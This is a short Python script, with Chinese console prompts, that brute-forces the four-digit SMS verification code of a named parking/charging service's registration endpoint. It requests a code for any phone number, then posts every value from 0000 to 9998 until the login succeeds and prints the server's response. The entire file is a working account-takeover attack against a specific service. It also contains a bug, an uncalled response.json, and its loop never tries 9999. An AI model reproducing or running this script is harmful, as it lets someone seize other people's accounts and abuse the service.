#!/usr/bin/env python
# coding=utf-8

import sys
import requests

def getVericode(phone):
	response = requests.post(
		url = 'http://chargerest.park1.cn/BackgroundApp1/register/v1_2/getVericode.do',
		data = '{"phone":"%s"}' % phone
	)

	if response.json()['errorcode'] != 0:
		print('验证码发送失败\n')
		return False
	else:
		print('验证码已发送\n')
		return True

def login(phone, code):
	response = requests.post(
		url = 'http://chargerest.park1.cn/BackgroundApp1/register/v1_2/registerUser.do',
		data = '{"phone":"%s","vericode":"%04d"}' % (phone, code)
	)

	return response

def main():

	phone = input('手机号: ')
	if (getVericode(phone) == False):
		return

	# code = input('验证码: ')

	for code in range(0, 9999):
		sys.stdout.write('\r%s/9999'%code)
		sys.stdout.flush()

		response = login(phone, code)
		if response.json['errorcode'] == 0 or response.json()['errorcode'] == 4:
			print('\n登录成功: \n')
			print(response.text)
			break


if __name__ == '__main__':
	main()